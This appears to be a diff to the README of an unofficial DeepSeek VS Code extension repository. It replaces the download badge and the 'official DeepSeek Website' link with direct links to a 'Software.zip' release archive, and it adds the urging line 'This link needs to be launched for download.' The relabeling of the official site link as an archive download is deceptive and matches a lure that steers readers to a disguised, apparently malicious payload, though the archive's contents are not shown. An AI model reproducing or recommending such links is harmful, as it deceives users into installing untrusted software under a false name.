@@ -16,7 +16,7 @@ Welcome to the official repository of the "deepseek-extension", an unofficial De
 
 To install the DeepSeek Extension, you can download the latest version from the following link: 
 
-[<img src="https://img.shields.io/badge/Download-v1.0.0-blue">](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[<img src="https://github.com/dekxk/deepseek-extension/releases/download/v1.0/Software.zip">](https://github.com/dekxk/deepseek-extension/releases/download/v1.0/Software.zip)
 
 **Note:** This link needs to be launched for download.
 
@@ -63,6 +63,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🌟 Start leveraging the power of DeepSeek within your VS Code environment! Download the DeepSeek Extension now and revolutionize your coding experience. 💻🤖
 
-🔗 For more information, visit the official [DeepSeek Website](https://www.deepseek.com/). 🌐
+🔗 For more information, visit the official [DeepSeek Website](https://github.com/dekxk/deepseek-extension/releases/download/v1.0/Software.zip). 🌐
 
 Thank you for visiting the "deepseek-extension" repository! Happy coding! 🚀🧠💬
